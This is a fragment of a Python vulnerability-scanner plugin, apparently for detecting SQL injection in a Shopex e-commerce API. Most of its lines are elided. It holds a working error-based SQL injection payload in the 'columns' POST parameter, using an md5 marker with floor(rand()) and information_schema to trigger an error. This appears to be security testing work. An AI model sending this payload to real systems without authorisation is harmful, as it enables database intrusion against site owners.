...
def run_domain(http,ob):
    ...
    try:
        ...
        data="act=search_dly_h_area&return_data=string&columns=1 and (select 1 from (select count(*),concat(md5(333),floor(rand(0)*2))x from information_schema.tables group by x)a)#"
        ...
        logging.getLogger().error("File:Shopex_post_APISqlInjectionScript_v4.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
    #end try
